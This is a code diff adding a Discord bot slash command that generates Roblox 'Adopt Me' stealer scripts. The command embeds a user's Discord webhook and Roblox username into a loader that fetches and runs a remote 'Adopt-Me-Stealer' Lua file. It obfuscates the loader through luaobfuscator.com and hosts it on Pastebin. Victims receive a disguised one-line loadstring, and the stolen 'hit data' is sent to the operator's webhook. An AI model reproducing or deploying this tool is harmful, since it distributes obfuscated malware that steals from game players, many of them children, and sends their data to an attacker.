@@ -1,0 +1,72 @@
+const { SlashCommandBuilder, EmbedBuilder } = require("discord.js");
+const axios = require('axios')
+ 
+module.exports = {
+  data: new SlashCommandBuilder()
+    .setName("gen")
+    .setDescription("generate your script")
+    .addStringOption((o) => o.setName("username").setDescription("your roblox username to run the cmd").setRequired(true))
+    .addStringOption((o) => o.setName("webhook").setDescription("webhook to send hit data to").setRequired(true))
+  ,
+  userPermissions: [],
+  botPermissions: [],
+ 
+  run: async(client, interaction) => {
+    const username = interaction.options.getString('username')
+    const webhook = interaction.options.getString('webhook')
+ 
+    await interaction.deferReply({ ephemeral: true })
+ 
+    const script = `_G.Webhook = "${webhook}"\n` +
+    `_G.Username = "${username}"\n` +
+    'loadstring(game:HttpGet("https://raw.githubusercontent.com/Kfc-Muncher-2000/Adopt-Me-Stealer/main/main.lua"))()'
+ 
+    const post1 = await axios.post(
+      'https://luaobfuscator.com/api/obfuscator/newscript',
+      script,
+      {
+        headers: {
+          'Content-type': 'plain/text',
+          'apikey': 'test'
+        }
+      }
+    );
+ 
+    const response = await axios.post(
+      'https://api.luaobfuscator.com/v1/obfuscator/obfuscate',
+      // '{ "MinifiyAll": true, "Virtualize": true }',
+      {
+        'MinifiyAll': true,
+        'Virtualize': true
+      },
+      {
+        headers: {
+          'content-type': 'application/json',
+          'apikey': 'test',
+          'sessionId': post1.data.sessionId
+        }
+      }
+    );
+ 
+    const pastebin = await axios.post(
+      'https://pastebin.com/api/api_post.php',
+      new URLSearchParams({
+        'api_dev_key': '', //get your pastebin api key
+        'api_paste_private': 1,
+        'api_paste_expire_date': 'N',
+        'api_paste_code': response.data.code,
+        'api_option': 'paste'
+      })
+    );
+ 
+    const finalScript = `loadstring(game:HttpGet("${pastebin.data}"))()`
+ 
+    const embed = new EmbedBuilder()
+    .setTitle('Vlorp Scripts | Generator')
+    .setColor('Blue')
+    .setDescription("```" + finalScript + "```")
+    .setFooter({text: 'Made with 💓 by snowydemise'})
+ 
+    await interaction.editReply({embeds: [embed], ephemeral: true})
+  }
+};
